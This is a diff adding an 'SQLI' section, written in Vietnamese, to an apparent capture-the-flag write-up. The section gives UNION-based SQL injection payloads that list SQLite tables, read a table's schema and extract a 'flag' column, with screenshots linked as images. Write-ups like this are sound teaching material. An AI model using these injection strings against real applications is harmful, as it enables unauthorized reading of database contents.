@@ -35,11 +35,24 @@ Base64
 ![image](https://github.com/user-attachments/assets/e85f7fff-fa60-434e-bf56-02d3efab8184)
 
 
+# SQLI
 
+![image](https://github.com/user-attachments/assets/85cd66b8-317f-450f-8e67-07690551feda)
 
+Lấy các bảng bằng payload như sau
+>a' union select 1,name,3 from sqlite_master where type='table'-- -
 
+![image](https://github.com/user-attachments/assets/f0cc536a-7494-4c2b-99e5-4c918f7ac6ef)
 
+Kiểm tra bảng more_table
 
+>a' union select 1,sql,3 from sqlite_master where name='more_table'-- -
+
+KIểm tra cột flag trong bảng more_table
+
+>a' union select flag,2,3 from more_table-- -
+
+![image](https://github.com/user-attachments/assets/90e55f04-5245-4a7c-a5bf-c5ca3ee1a075)
 
 
 
